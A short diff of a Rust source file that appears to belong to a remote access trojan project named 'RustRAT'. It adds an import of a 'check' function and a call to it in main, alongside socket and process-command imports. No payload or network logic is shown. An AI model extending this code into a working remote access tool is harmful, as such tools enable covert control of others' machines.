@@ -28,6 +28,7 @@ use std::net::{Ipv4Addr,SocketAddrV4};
 use std::net::Shutdown;
 use std::net::{TcpStream,TcpListener};
 use std::process::Command;
+use RustRAT::check;
 
 const ADDR:Ipv4Addr = Ipv4Addr::new(127,0,0,1);
 //This is the constant address made for the socket
@@ -186,6 +187,7 @@ fn main(){
     );
 
     //Work area
+    check();
     
 
 
